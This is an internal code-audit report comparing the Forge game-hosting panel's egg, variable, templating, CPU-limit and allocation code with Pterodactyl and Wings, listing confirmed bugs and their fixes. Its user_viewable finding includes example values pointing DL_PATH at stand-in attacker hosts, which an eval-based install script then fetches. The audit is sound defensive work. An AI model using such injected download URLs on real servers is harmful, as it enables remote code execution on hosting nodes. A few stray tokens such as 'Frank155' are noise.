# Reverification Subagent 02 — Eggs/Nests/Egg Variables/Startup Templating/Template Systems vs Forge+Beacon

**Date:** 2026-08-24  
**Focus:** GH-13..GH-19 (FINAL_PARITY_AUDIT.md), Phase-02 subagent-02-eggs-templates, Phase-06 subagent-06-templates-catalog, Final-Parity subagent-01 GH-13..16, MASTER_FINDING_INDEX REF-GAME-F-G-08..10  
**Method:** Live `read`+`grep` re-inspection of 6 reference game-hosting repos vs 8 Forge layers, no trust of prior synthesis. All claims `file:line` SOURCE_VERIFIED. Branch: `mvp-2` (main detached, `packages/game-templates` absent on main).

---

## 0. Reconciliation Premise

| Source | Claim | Live Verdict |
|---|---|---|
| `audits/FINAL_PARITY_AUDIT.md:56-58` GH-13 `PARTIAL`, GH-14 `BROKEN (P0)` regex slash, GH-15 `MISSING` parser, GH-16 `DUPLICATE` templates | GH-14 BROKEN strips `/…/` naive | **CONFIRMED** — `store_egg_variables.go:176` still compiles `arg="/^…/"` literally |
| `audits/phase-02/subagent-02-eggs-templates.md:187` LF-01 HIGH regex delimiter bug `validateVariableValue` | Blocks PTDL imports `minecraft-paper.json:58` | **CONFIRMED** — same code, plus `Split("|")` splits regex `|` |
| `audits/phase-06/subagent-06-templates-catalog.md:183` L3 seeding 93% deficit (1 egg vs 14) | Production ships 1 egg, CI never validates | **CONFIRMED** — `091_seed_minecraft_java.sql:3` 1 egg, `packages/game-templates` absent on main, `egg-templates.ts:27` 14 phantom |
| `audits/final-parity/subagent-01-game-hosting.md:425-482` C-14 BROKEN P0 regex, C-13 COMPLETE, C-15 DUPLICATE+MISSING, C-17 MISSING parser | 4 LF table re-affirmed F-G-08..10 | **CONFIRMED** — user_viewable leak, CPU conflation still present |
| `audits/MASTER_FINDING_INDEX.md:47-49` REF-GAME-F-G-08 regex delimiter BROKEN, F-G-09 CPU conflation BROKEN, F-G-10 user_viewable gate leak BROKEN | All OPEN | **CONFIRMED** — no patch landed (single commit `8bd9ba7` since, not touching store) |

**Overall:** All three indexed findings **still BROKEN**. GH-14 remains P0 — no `regex:/…/` stripping, no `|`-aware split, no `RESERVED_ENV_NAMES` guard added.

---

## 1. Capability Matrix (15 rows, >=12 required)

### R-01 — Nests (service categories)

- **Reference:** `reference/game-hosting/pterodactyl-panel/app/Models/Nest.php:19` `nests(id,uuid,author,name,description)` `Nest.php:54` hasMany eggs; Pelican `Egg.php:1` identical + tags.
- **Forge DB:** `forge/api/migrations/007_postgres_core_foundation.sql:87` `nests(id UUID PK, name TEXT UNIQUE, description)` `106` seeds `Games` via `ddd...`; no `uuid/author` columns.
- **Forge Store:** `forge/api/internal/store/store_nests.go:16` `Nest{ID,Name,Description,EggCount}` `100` `ListNests` counts eggs, `137` `CreateNest` trims+requires name, `172` `DeleteNest` counts without `FOR UPDATE`.
- **Forge API:** `forge/api/internal/http/handlers_admin.go:990` `GET /nests` `1016` `POST /nests` `1043` `PATCH` `1067` `DELETE` `eggCount>0→400` reuse.
- **Forge Web:** `forge/web/app/admin/nests/page.tsx:1` `AdminNestsEggs` aggregates nests+eggs; `forge/web/app/admin/nests/[nestId]/eggs/page.tsx:1` CRUD.
- **Bacon:** N/A — provision target loads `e.docker_images` only `forge/api/internal/store/store_servers_control.go:88`.
- **Status:** `COMPLETE` (intentional simplification; permissive ordering, UUID PK replaces separate uuid column)
- **Gap:** Drops `author` audit; `DeleteNest:172` race where concurrent `CreateEgg` after count but before `DELETE` violates FK (low risk admin path). No `uuid` alias exposure.

### R-02 — Eggs (templates)

- **Reference:** `reference/game-hosting/pterodactyl-panel/app/Models/Egg.php:52` columns `docker_images JSON,startup,config_files/startup/logs/stop,file_denylist,script_install/container/entry,file_denylist,forces,features,copy_script_from,config_from,EXPORT_VERSION PTDL_v2` `Egg.php:68`.
- **Forge DB:** `forge/api/migrations/043_unify_eggs_templates_mounts.sql:63` migrates `server_templates→eggs` preserving UUIDs `089_egg_parity_fields.sql` adds `config_from,copy_script_from,update_url,features,startup_commands`.
- **Forge Store:** `forge/api/internal/store/store_nests.go:34` `Egg{DockerImages json.RawMessage,Startup,Config,DefaultMemoryMB,InstallScript…,FileDenylist,ConfigFrom,CopyScriptFrom,Features…}` `190` `ListEggs` join `nests.name`, `248` `CreateEgg` via `normalizeDockerImages:361`.
- **Forge API:** `handlers_admin.go:1083` `GET /eggs` `1098` `GET /nests/:nestId/eggs` `1124` `POST /eggs` `1156` `PATCH` `1270` `DELETE`.
- **Forge Beacon:** `store_servers_control.go:88` `ServerProvisionTarget` selects `COALESCE(NULLIF(s.docker_image,''),(SELECT value FROM jsonb_each_text(e.docker_images) ORDER BY key LIMIT 1),'')` `114` picks lexicographically-first image.
- **Status:** `COMPLETE`
- **Gap:** `normalizeDockerImages:361` accepts `map[string]string` **or** legacy `[]string` and normalizes to map — *more permissive* than panel post-2022 map-only; correctly prefers server override.

### R-03 — Docker Images Shape

- **Reference:** `reference/game-hosting/pterodactyl-panel/app/Models/Egg.php:84-108` `docker_images array cast` validation `docker_images.* regex` `Egg.php:134`; `reference/game-hosting/pterodactyl-panel/app/Models/Server.php:89` deprecated `docker_image` string.
- **Forge Store:** `store_nests.go:361` `normalizeDockerImages` handles both shapes `store_nests.go:99` `templateFromEgg` sorts keys `store_templates.go:99` picks `keys[0]`; `store_startup.go:14` same `COALESCE` fallback.
- **Forge Types:** `forge/api/internal/store/store_nests.go:42` `json.RawMessage`, `packages/shared-types` not inspected but DTO exposes `Record<string,string>` via compat.
- **Status:** `COMPLETE+` (dual-shape handling)
- **Gap:** None functional; beacon `docker.go:901` validates `image non-empty` but not label map separately — registry auth separate.

### R-04 — Egg Variables Model + Validation Contract

- **Reference:** `reference/game-hosting/pterodactyl-panel/app/Models/EggVariable.php:29` `egg_variables(id,egg_id,name,env_variable,default_value,user_viewable,user_editable,rules)` `43` `RESERVED_ENV_NAMES = SERVER_MEMORY,SERVER_IP,SERVER_PORT,ENV,HOME,USER,STARTUP,SERVER_UUID,UUID` `70` `rules` Laravel string.
- **Forge DB:** `forge/api/migrations/013_startup_variables.sql:26` seed `required|string|max:64` `007:87` eggs + `091:31` `VERSION/TYPE` vars.
- **Forge Store:** `forge/api/internal/store/store_egg_variables.go:15` `eggVariableNamePattern = ^[A-Z][A-Z0-9_]*$` `17` `EggVariable{Name,EnvVariable,DefaultValue,UserViewable,UserEditable,Rules,Sort}` `65` `CreateEggVariable` `129` `validateEggVariableRequest`.
- **Forge Web:** `forge/web/app/admin/nests/[nestId]/eggs/[eggId]/variables/page.tsx:1` CRUD mirrors.
- **Status:** `PARTIAL` (see R-05 LF-01)
- **Gap:** No `RESERVED_ENV_NAMES` guard; pattern stricter uppercase only (panel allows `^[\w]{1,191}$`). Missing `notIn:RESERVED` allows `SERVER_*` overwrite attempt (partially mitigated by `user_viewable` gate but not spec-enforced).

### R-05 — Variable Validation Regex (GH-14) — THE P0

- **Reference:** `reference/game-hosting/pterodactyl-panel/app/Models/EggVariable.php:66` `rules: "required|regex:/^([\w\d._-]+)(\.jar)$/"` via `VariableValidatorService.php:28` Laravel `ValidationFactory` strips `/…/` delimiters + flags.
- **Forge Store:** `forge/api/internal/store/store_egg_variables.go:142` `validateVariableValue(value,rules string)` `143` `strings.Split(rules,"|")` `145` `strings.Cut(rule,":")` `176` `regexp.Compile(arg)` `181` `pattern.MatchString(value)`.
- **Forge Template Payload:** `forge/web/lib/egg-templates.ts:80` `SERVER_JARFILE rules: "required|regex:/^([\w\d._-]+)(\.jar)$/"` (identical to `packages/game-templates/templates/minecraft-paper.json:58` when package present).
- **Forge API Import Loop:** `forge/api/internal/http/handlers_admin.go:1308` `POST /eggs/import` `1354` iterates `req.Variables` → `CreateEggVariable` → `validateVariableValue` per variable.
- **Beacon:** N/A — validation is control-plane.
- **Status:** `BROKEN (P0)` — **GH-14 still BROKEN, not FIXED.**
- **Gap Detail:** See Finding F-01 below. `regexp.Compile("/^([\w\d._-]+)(\.jar)$/")` treats slashes literal; `server.jar` fails `must be /server.jar/`. `Split("|")` also splits regex alternation `|`. `301` `minecraft-paper` cannot be imported via `POST /eggs/import` — all Paper/Vanilla eggs with regex vars 400. No commit touching file since audit.

### R-06 — Startup Templating `{{VAR}}` Resolution

- **Reference:** `reference/game-hosting/pterodactyl-panel/app/Models/Egg.php:29` `startup` with `{{SERVER_MEMORY}},{{SERVER_PORT}},{{SERVER_IP}}` resolved via `StartupModificationService`; `reference/game-hosting/pterodactyl-wings/server/server.go:151` injects fixed `TZ,STARTUP,SERVER_MEMORY,SERVER_IP,SERVER_PORT` then appends `EnvVars`.
- **Forge Store:** `forge/api/internal/store/store_schedules.go:14` `resolveStartupCommand(raw,env)` `20` `ReplaceAll "{{"+key+"}}"` + lowercase variant `20`; `forge/api/internal/store/store_startup.go:50` `details.StartupCommand = resolveStartupCommand(RawStartupCommand, env)` `11` `GetServerStartup` builds `env[EnvVariable]=ServerValue` filtered `user_viewable=true:31`.
- **Forge Service:** `forge/api/internal/services/clustermanager/service.go:632` `runtimeCreateRequest:641` injects `SERVER_MEMORY/SERVER_IP/SERVER_PORT` from allocation, merges `target.Environment`; `store_servers_control.go:179` `target.StartupCommand = resolveStartupCommand(target.StartupCommand,target.Environment)` (no viewable filter, all vars).
- **Forge Beacon:** `beacon/internal/runtime/docker.go:1003` rebuilds `container.Config{Env,Cmd,Image}` from `CreateRequest.Env` strings; `beacon/internal/runtime/runtime.go:55` `CreateRequest{Env []string}`.
- **Status:** `PARTIAL`
- **Gap:** Only `{{VAR}}` and `{{lower}}` substituted; `{{server.build.default.port}}` / `{{server.build.default.ip}}` / `{{config.*}}` literals remain (see R-08). `user_viewable=false` vars like `DL_PATH` `egg-templates.ts:86` correctly excluded from `GetServerStartup:31` UI but **included** in `ServerProvisionTarget:154` runtime (intentional) — but then leak at creation (see R-12).

### R-07 — Config File Parser (GH-15) — 6 parsers

- **Reference:** `reference/game-hosting/pterodactyl-wings/parser/parser.go:1` 6 parsers `file/yaml/properties/ini/json/xml` with `find/replace` rules, wildcard `.*`, array `something[1]`, `configMatchRegex {{config.docker.interface}}`, `xmlValueMatchRegex`; consumed in `server/update.go` before start.
- **Forge DB:** `store_nests.go:57` `Egg.Config json.RawMessage` stores raw `config` JSON; `store_servers_control.go:96` `e.config::text` as `ConfigJSON` `97`.
- **Forge Template:** `forge/web/lib/egg-templates.ts:63` `config.files["server.properties"]{parser:properties,find:{"server-ip":"0.0.0.0","server-port":"{{server.build.default.port}}","query.port":"{{server.build.default.port}}"}}` `68` `server-port` placeholder literal.
- **Forge Beacon:** `beacon/internal/server/server.go:869` `applyConfigurationFiles` **not** parsing `config.files` — only writes `server.json` raw; `beacon/internal/runtime/docker.go` no parser package ported; `store_servers_control.go:95` `e.config` stored not applied comment in FINAL_PARITY_AUDIT `GH-15`.
- **Status:** `MISSING` — **not FIXED, still MISSING** (requires porter decision).
- **Gap:** Minecraft servers start on wrong port (`server-port` not patched to `SERVER_PORT` allocation); `{{server.build.default.port}}` remains literal in file. PH. `store_schedules.go:14` doesn't handle builtins either. Need `beacon/manager.go:onBeforeStart` port of `wings/parser` (~300 LoC) or explicitly strip `config.files` from templates and document unsupported.

### R-08 — Builtin Placeholders `{{server.build.default.port}}` vs `{{SERVER_PORT}}` Drift

- **Reference:** Wings `parser/parser.go` `configMatchRegex` resolves `{{config.docker.interface}}` etc.; panel `StartupModificationService` injects `SERVER_MEMORY/IP/PORT`.
- **Forge Template:** `egg-templates.ts:68-69` `{{server.build.default.port}}` inside `config.files` vs `egg-templates.ts:41` `{{SERVER_JARFILE}}` inside `startup`; `validate-templates.mjs` (branch-only) hardcodes 9 builtins but only validates `startup+config.files` placeholders not `install_script`.
- **Forge Store:** `store_schedules.go:14` `resolveStartupCommand` does not handle `server.build.default.*`; `store_servers_control.go:179` same.
- **Status:** `BROKEN` (subset of R-07)
- **Gap:** Dual syntax with no single resolver; allocation-port file patch path completely inert.

### R-09 — Template Systems vs Single DB Eggs (GH-16) — Duplication & Seeding Deficit

- **Reference:** Pterodactyl `eggs` single DB canonical; PufferPanel `spec.json:1` 44 JSON payloads 36 types strict `additionalProperties:false`.
- **Forge System A (DB canonical):** `forge/api/migrations/007_postgres_core_foundation.sql:106` `Games` nest, `091_seed_minecraft_java.sql:3` 1 egg `Minecraft Java` `empty startup` + 2 vars `VERSION/TYPE:31,44`; `store_nests.go:16` `ListNests`/`ListEggs`.
- **Forge System B (FS static bundle):** `forge/web/lib/egg-templates.ts:27` `EGG_TEMPLATES: EggTemplateItem[]` 14 entries (`minecraft-paper:15`, `minecraft-vanilla:84`, `palworld:130` … `zomboid:493`) hardcoded TS, no validator, `installScript` shell.
- **Forge System C (FS package):** `packages/game-templates` **absent on main HEAD** (`ls /Users/riyaz/project/gamepanel/packages → sdk, shared-types`) — 14 curated `template-schema.json:1` + `src/types.ts:10` only on worktree branches (`.freebuff/worktrees/*/packages/game-templates`). `audits/phase-06/subagent-06-templates-catalog.md:18-20` notes 14 on branch, 0 on main.
- **Forge System D (localStorage):** `forge/web/lib/app-templates-data.ts:3` `STORAGE_KEY forge.app-templates.v1` 5 defaults (`nginx,node,python,postgres-compose,redis`) entirely client-side, never hits DB (`forge/web/lib/api/apps.ts:368` fallback).
- **Forge Compat Shim:** `forge/api/internal/store/store_templates.go:12` `ListTemplates` delegates to `ListEggs` via `templateFromEgg:99`; `handlers_admin.go:2037` `/templates` shim over eggs with `Games` nest fallback.
- **Status:** `DUPLICATE` + `MISSING` seeding — **still GH-16 DUPLICATE, not FIXED**
- **Gap:** 93% deficit (1 vs 14 vs 44 Puffer). `ListEggs(ctx,"")` fresh returns 1 row; `EGG_TEMPLATES` wizard pre-fills DB creation but not seeded; `SyncFromRemote` etc not wired for game-templates. No `SeedGameTemplates` idempotent boot like `appstore/seed.go:27` 7 compose apps. CI on main cannot run `validate-templates.mjs:1` (directory missing). Need single source: generate `egg-templates.ts` from DB seed or vice-versa.

### R-10 — Install Pipeline: Typed 24 Ops vs Single Shell Blob

- **Reference:** `reference/game-hosting/pufferpanel-templates/spec.json:307` `$defs/operation` 26 typed ops (`mojangdl,paperdl,steamgamedl,javadl,forgedl,…`) each with `if:string` + `groups/internal/supportedEnvironments`.
- **Forge Template (FS):** `egg-templates.ts:44` `installScript: "#!/bin/ash … curl … api.papermc.io …"` 80-line imperative; `egg-templates.ts:106` vanilla `#!/bin/ash` `curl launchermeta…`; `egg-templates.ts:156` `palworld` `steamcmd 2394010`.
- **Forge Store:** `store_nests.go:34` `Egg{InstallScript,InstallContainer,InstallEntrypoint}` single blob `store_nests.go:232` no validation against 24-op catalogue.
- **Forge Beacon:** `beacon/internal/runtime/docker.go:256` creates `mgp-{id}-installer` bind-mount `RootDir→/mnt/server` `User 1000:1000` `ReadonlyRootfs:true` `CapDrop:ALL` `Tmpfs /tmp 64M` pulls image, waits, caps log 1MiB `340`, cleanup.
- **Status:** `PARTIAL` (functional but lossy)
- **Gap:** Conditional `if: env=='host'` vs `env=='docker'`, `if: file_exists('forge…shim.jar')`, typed `appId` validation, `pre: [resolveforgeversion]` hooks lost — shell must re-implement, no static guard. Typo `"25855"` would pass schema but fail at runtime.

### R-11 — Egg Import / Export (PTDL)

- **Reference:** `reference/game-hosting/pterodactyl-panel/app/Models/Egg.php:68` `EXPORT_VERSION PTDL_v2` export envelope `docker_images` map; import via `ImportEggService` validates Laravel rules.
- **Forge API:** `handlers_admin.go:1288` `GET /eggs/:id/export` returns `{egg,variables}` raw (not PTDL_v2 envelope); `1308` `POST /eggs/import` `1312` `struct {NestID,Name,DockerImages,Startup,Config,Variables []importedVariable}` `1341` `CreateEgg` then `1354` loop `CreateEggVariable` per var via `validateVariableValue`.
- **Forge Store:** `store_nests.go:248` `CreateEgg` via `normalizeDockerImages:361`; `store_egg_variables.go:65`.
- **Status:** `PARTIAL`
- **Gap:** Export not PTDL_v2 compatible; import **fails** for any egg with `regex:/…/` vars until F-01 fixed — stock Paper cannot be imported (see GH-14).

### R-12 — `user_viewable` Gate Leak at CreateServer (REF-GAME-F-G-10)

- **Reference:** `reference/game-hosting/pterodactyl-panel/app/Services/Servers/VariableValidatorService.php:31` `where('user_editable',true)->where('user_viewable',true)` for non-admin; blocks `DL_PATH`.
- **Forge UI Gate:** `store_startup.go:31` `WHERE … AND ev.user_viewable=true` (display) `58` `WHERE … AND ev.user_viewable=true AND ev.user_editable check:70` (update) — correct for UI.
- **Forge Provision Target (runtime):** `store_servers_control.go:154` `SELECT ev.env_variable … FROM egg_variables` **without** `user_viewable` filter + injects **all** vars including `user_viewable=false` `DL_PATH` (`egg-templates.ts:86` `DL_PATH userViewable:false userEditable:false rules:"nullable|string"`).
- **Forge CreateServer Path:** `store_servers.go:273` `for key,value := range req.StartupVariables` `275` `SELECT rules FROM egg_variables WHERE egg_id=$1 AND env_variable=$2` **without** viewable/editable gate `278` `validateVariableValue` then `281` insert — **non-admin can set `DL_PATH` at provision**.
- **Forge Delegation:** `forge/api/internal/http/server.go:567` `CreateServerRequest{StartupVariables map[string]string}` `handlers_servers.go:838` `clusterManager.CreateServer -> store.CreateServer:140` no actor permission gate.
- **Status:** `BROKEN` — **REF-GAME-F-G-10 still BROKEN**
- **Gap:** Creation-time bypass of `user_viewable/editable` + missing `RESERVED_ENV_NAMES` allows sandbox escape via installer URL injection (`copy_script_from` style): attacker sets `DL_PATH=https://evil/payload.sh` at provision, later cannot change it (read-only) but initial injection succeeds. Must gate `StartupVariables` by `user_editable && user_viewable` for non-admin principals.

### R-13 — CPU `cpu_shares` vs `CPUPercent/CPULimit` Conflation (REF-GAME-F-G-09)

- **Reference:** `reference/game-hosting/pterodactyl-wings/environment/settings.go:37` `Limits{MemoryLimit,Swap,IoWeight,CpuLimit,DiskSpace,Threads,OOMDisabled}` `66` `ConvertedCpuLimit()`, `116` `BlkioWeight` conditional `settings.go:124` only sets `CPUShares=1024` when `CpuLimit>0`.
- **Forge API:** `forge/api/internal/http/server.go:567` `CreateServerRequest{CPUShares *int,CPU *int}` distinct; `store_servers.go:209` `if MemoryMB<=0||CPUShares<=0||CPULimit<0||DiskMB<=0…` allows `CPUShares=1024` default alongside `CPULimit=0` (unlimited).
- **Forge Client → Beacon:** `forge/api/internal/daemon/client.go:401` `CreateRequest{CPUShares int64,CPUPercent int64}` both; `forge/api/internal/services/clustermanager/service.go:671` maps `CPUShares/CPULimit` → `daemon CreateRequest`; `beacon/internal/runtime/runtime.go:55` `CreateRequest{CPUShares,CPUPercent,MemoryMB,SwapMB,IOWeight…}`.
- **Forge Beacon:** `beacon/internal/runtime/docker.go:901` `validateCreateRequest` `921` `CPUShares 2..262144` `924` `CPUPercent 0..100000` `786` `if CPUPercent>0 quota=period*CPUPercent/100` `802` always sets `CPUShares` regardless of `CPUPercent==0`.
- **Status:** `BROKEN` — **REF-GAME-F-G-09 still BROKEN**
- **Gap:** Store allows unlimited `CPULimit=0` with `CPUShares=1024` still propagated; beacon diverges from `settings.go:124` conditional; naming `CPULimit` vs `CPUPercent` vs `cpu` ambiguous (percent vs weight vs quota). Unlimited still throttled via weight `1024` vs Wings unlimited (CPUQuota 0 weight irrelevant). Needs alignment: validate `CPULimit 0..threads*100` → `CPUPercent 0..100000`, gate `CPUShares` on `CPULimit>0`.

### R-14 — Allocations: `protocol`+`containerPort` Fidelity

- **Reference:** `reference/game-hosting/pterodactyl-wings/environment/allocations.go:36` `Mappings map[string][]int` no protocol; `allocations.go:54` `Bindings()` binds every port as both tcp+udp.
- **Forge Store:** `forge/api/internal/store/store_allocations.go:15` `Allocation{IP,Port,ContainerPort,Protocol,Alias}` `134` `CreateAllocations` bulk Tx `148` `protocol tcp|udp default tcp` `Frank155` `containerPort 0→port` `169` duplicate handling `pg 23505`; `367` `SetPrimaryAllocation` Tx `FOR UPDATE`.
- **Forge Beacon:** `beacon/internal/runtime/runtime.go:100` `PortBinding{HostIP,HostPort,ContainerPort,Protocol}` `beacon/internal/runtime/docker.go:865` `dockerPorts` validates `tcp|udp` duplicate `HostIP:HostPort/Protocol` `888`.
- **Forge Service Legacy Fallback:** `forge/api/internal/services/clustermanager/service.go:698` `allocations["mappings"]=map[string][]int` drops protocol (GH-??); `daemon/client.go:438` `Port{HostIP,HostPort,ContainerPort,Protocol}` explicit.
- **Status:** `COMPLETE+` (explicit protocol superior)
- **Gap:** Legacy `Mappings` compat path loses protocol → UDP-only `8211` also binds tcp when that fallback consumed. Verify DB unique index is `(node_id,ip,port,protocol)` not just `(node_id,ip,port)` (check `090_allocation_transport.sql` — assumption in FINAL_PARITY_AUDIT GH-11).

### R-15 — Beacon Create Validations vs Panel

- **Reference:** `reference/game-hosting/pterodactyl-wings/environment/settings.go:124` `AsContainerResources` conditional shares; `server/server.go:151` env injections.
- **Forge Panel:** `store_servers.go:209` validation `MemoryMB<=0→error` etc not capping `CPULimit` at `100000` unlike beacon `docker.go:924`.
- **Forge Beacon:** `beacon/internal/runtime/docker.go:901` `validateCreateRequest:901-979` enforces `MemoryMB<0, SwapMB<0, Swap>0&&Memory==0→error, CPUShares 2..262144, CPUPercent 0..100000, IOWeight 10..1000, PIDLimit, UID/GID` pair, `NetworkName` required, `dockerPorts` duplicate detection.
- **Status:** `PARTIAL`
- **Gap:** Panel vs beacon validation asymmetry (store allows `CPULimit=0…∞`, beacon caps). Reported as 200→400 for same payload if create path split (similar to `phase-06` COMP bifurcation).

---

## 2. Findings (Reverified, >=3 required)

### F-01 — [P0] Regex Slash Delimiter Bug Blocks All PTDL Imports — GH-14 / REF-GAME-F-G-08 — **STILL BROKEN**

**Files:**
- `forge/api/internal/store/store_egg_variables.go:142` `func validateVariableValue` `143` `strings.Split(rules,"|")` `145` `strings.Cut(rule,":")` `176` `regexp.Compile(arg)` `181` `pattern.MatchString`
- `forge/api/internal/store/store_egg_variables.go:15` `eggVariableNamePattern`
- `forge/web/lib/egg-templates.ts:80` `rules: "required|regex:/^([\w\d._-]+)(\.jar)$/"` (triggers)
- `forge/api/internal/http/handlers_admin.go:1308` `POST /eggs/import` `1354` loop `CreateEggVariable` → `validateEggVariableRequest:129` → `validateVariableValue`
- `reference/game-hosting/pterodactyl-panel/app/Models/EggVariable.php:66` (`regex:/…/`) and `VariableValidatorService.php:28`

**Live:** `validateVariableValue` iterates `Split("|")`, then `Cut(":")`. For `rules="required|regex:/^([\w\d._-]+)(\.jar)$/"` yields `name=regex, arg="/^([\w\d._-]+)(\.jar)$/"` including leading/trailing `/`. `regexp.Compile("/^…$/")` expects literal slashes — `server.jar` fails (`value does not match the required pattern`). Also `Split("|")` naïvely splits inside regex alternation (`regex:/^(foo|bar)$/` → `["regex:/^(foo","bar)$/"]` → second rule `bar)$/` unsupported). `091_seed` `max:64` passes only because it lacks regex; any regex import fails.

**Impact:** Cannot import *any* stock Pterodactyl Paper/Vanilla/Bungeecord egg that contains regex-validated variables (most Minecraft ecosystems). Fresh Forge ships 1 egg, operator expects to import PTDL_v2 `minecraft-paper.json` → 400 per variable.

**Repro:**
```bash
POST /eggs/import { nestId:"<Games>", name:"Paper", dockerImages:{"Paper":"ghcr.io/…"},
  startup:"java -jar {{SERVER_JARFILE}}", variables:[
    {name:"Server Jar File",envVariable:"SERVER_JARFILE",defaultValue:"server.jar",
     userViewable:true,userEditable:true,rules:"required|regex:/^([\\w\\d._-]+)(\\.jar)$/",sort:10}
  ]}
→ 500 "failed to import variable SERVER_JARFILE: value does not match the required pattern"
# via direct: POST /eggs/:id/variables { rules:"required|regex:/^([\w\d._-]+)(\\.jar)$/", defaultValue:"server.jar"} → 400
```

**Expected:** Strip leading `/` and trailing `/[flags]*` before `Compile`; split rules with Laravel-compatible parser (respect `|` inside `regex:`; e.g., scan and keep `regex:` arg intact, or use `strings.Split` but re-join segments that lack `:` after first). Handle `/i` etc flags by lowering. Add test covering `regex:/^…$/` with `server.jar`.

**Verdict vs Prior:** FINAL_PARITY_AUDIT GH-14 `BROKEN (P0)`, phase-02 LF-01 HIGH, final-parity C-14 BROKEN P0 all **confirmed still BROKEN** — zero delta. MASTER index REF-GAME-F-G-08 OPEN stays OPEN.

---

### F-02 — [P1] `user_viewable=false` Gate Leak at CreateServer — REF-GAME-F-G-10 — **STILL BROKEN**

**Files:**
- `forge/api/internal/store/store_startup.go:31` `WHERE ev.user_viewable=true` (Get) `58` `WHERE … AND ev.user_viewable=true` (Update) + `70` editable gate
- `forge/api/internal/store/store_servers_control.go:154` `SELECT ev.env_variable… FROM egg_variables` **without** viewable filter (provision)
- `forge/api/internal/store/store_servers.go:273` `CreateServer` loop `Lookup rules WHERE egg_id+env_variable` no viewability, only existence + `validateVariableValue`
- `forge/web/lib/egg-templates.ts:86` `DL_PATH userViewable:false userEditable:false rules:"nullable|string" default:""` (internal)
- `reference/game-hosting/pterodactyl-panel/app/Services/Servers/VariableValidatorService.php:31` non-admin filters `user_editable && user_viewable`

**Live:** Non-admin (`PermSettingsReinstall` etc) can pass `startupVariables:{"DL_PATH":"https://attacker.example/pwn.sh"}` at `POST /servers` (`handlers_servers.go:838`). `store_servers.go:275` accepts because `DL_PATH` exists as egg variable and `nullable|string` validates any string. Later `UpdateServerStartupVariable` (`store_startup.go:58`) would reject same key (viewable=false). Pterodactyl blocks entirely via `VariableValidatorService`. Forge runtime then injects `DL_PATH` into installer via `runtimeInstallRequest` `target.Environment` map (`clustermanager/service.go:681`) and `egg-templates.ts:49` install script `DOWNLOAD_URL=$(eval echo $(echo ${DL_PATH} | sed -e 's/{{/${/g' -e 's/}}/}/g'))` eval-injects URL → arbitrary download.

**Impact:** Inconsistent authorization — internal variable writable at provision time, read-only thereafter. Allows installer URL hijack + potential sandbox escape if `copy_script_from/config_from` not validated (config_from lets egg reference another egg's script).

**Expected:** Gate `CreateServer` startup variables by `user_viewable && user_editable` for non-admin principals (pass actor role into `CreateServer` or check at handler). Add `RESERVED_ENV_NAMES` set (`SERVER_MEMORY/SERVER_IP/SERVER_PORT/ENV/HOME/USER/STARTUP/SERVER_UUID/UUID`) reject.

**Verdict:** MASTER F-G-10 OPEN stays OPEN; FINAL_PARITY_AUDIT GH-?? `PARTIAL (see GH-14)` buried but final-parity C-14 LF also flags. **Not FIXED.**

---

### F-03 — [P1] CPU Shares vs Percent Conflation — Unlimited Still Weighted — REF-GAME-F-G-09 — **STILL BROKEN**

**Files:**
- `forge/api/internal/store/store_servers.go:209` `if MemoryMB<=0||CPUShares<=0||CPULimit<0…` (allows `CPULimit=0, CPUShares=1024`)
- `forge/api/internal/services/clustermanager/service.go:671` `runtimeCreateRequest` passes both `CPUShares/CPULimit` unconditionally
- `beacon/internal/runtime/docker.go:901` `validateCreateRequest:921` `CPUShares 2..262144` `924` `CPUPercent 0..100000` `783` `buildResources:786` `quota=period*CPUPercent/100 if >0` + always `CPUShares`
- `reference/game-hosting/pterodactyl-wings/environment/settings.go:37` `Limits{CpuLimit int64 percent}` `124` conditional shares
- `forge/api/internal/http/server.go:567` `CreateServerRequest{CPUShares *int,CPU *int}` distinct but stored as `cpu_shares/cpu_limit`

**Live:** Creating server with `cpu=0` (unlimited per panel semantics `0 = unlimited`) still sets `cpu_shares=1024` (default) and beacon enforces weight `1024` via `Resources.CPUShares`. Wings `settings.go:124` only sets shares when `CpuLimit>0`; unlimited means `CPUQuota 0` + `CPUShares 0` (no limit). Forge wrongly throttles unlimited. Also panel allows `CPULimit` uncapped while beacon caps `CPUPercent 0..100000` — mismatched units (centipercent vs percent vs threads*100).

**Impact:** Silent wrong throttling, not crash; API vs beacon validation diverge (panel accepts large `CPULimit` that beacon rejects → 200 create then provision failure async).

**Expected:** Align `CPULimit` semantics: panel validates `0..threads*100` (or `0..100000` centi) mirroring wings; gate `CPUShares` propagation on `CPULimit>0`; unify naming `cpuLimit` vs `cpuPercent` vs `cpu`.

**Verdict:** MASTER F-G-09 OPEN stays OPEN; FINAL_PARITY_AUDIT GH-?? conflation row confirmed.

---

### F-04 — [P1] Seeding Deficit 93% + Dual Catalog Divergence — REF-P6-TMPL-01 / GH-16 — **STILL BROKEN/DUPLICATE**

**Files:**
- `forge/api/migrations/091_seed_minecraft_java.sql:3` `INSERT eggs ('Minecraft Java','itzg/minecraft-server:java21','',…)` 1 row `31` `VERSION/TYPE` 2 vars
- `forge/web/lib/egg-templates.ts:27` `EGG_TEMPLATES:14` (`minecraft-paper:15` … `zomboid:493`)
- `forge/api/internal/store/store_templates.go:12` `ListTemplates` compat shim `store_nests.go:16` canonical DB
- `forge/web/lib/app-templates-data.ts:3` `localStorage v1` 5 templates `forge/web/app/admin/app-templates/page.tsx:1`
- `reference/game-hosting/pufferpanel-templates/spec.json:1` 44 JSON 36 types

**Live:** Fresh `migrate → ListEggs` returns 1 egg. Curated 14 `EGG_TEMPLATES` exist only as frontend constant (no `DefaultSeeder` wires). `packages/game-templates` directory **does not exist on main** (`ls packages → sdk, shared-types`) — only on historical worktrees `.freebuff/worktrees` — so CI on main never runs `scripts/validate-templates.mjs:1`. `GetAllTemplates()` (`lib/api/apps.ts:368`) hits `/admin/app-templates` then falls back to localStorage, never touches eggs. Three systems unsynced, overlapping but disconnected; no `SeedGameTemplates` idempotent boot like `appstore/seed.go:27` 7 compose apps.

**Impact:** Operator expectation vs reality — docs/UI Browse Templates navigates to `EggTemplate` wizard (`components/admin/AdminTemplates.tsx:9` imports `EGG_TEMPLATES`) but DB has 1 row; manual paste import (`AdminNestsEggs.tsx:124` validates only `dockerImages.length>0`) required per egg, no batch. Claim "Forge ships 14 game servers out of the box" false on main.

**Expected:** Choose single canonical: either move curated package to `forge/packages/game-templates` reachable on main and add `store/seeder.go:DefaultSeeder` upsert of `EGG_TEMPLATES` (like `SeedDefaultApps`), or delete package and generate `egg-templates.ts` from DB. Add idempotent migration seeding 14 eggs.

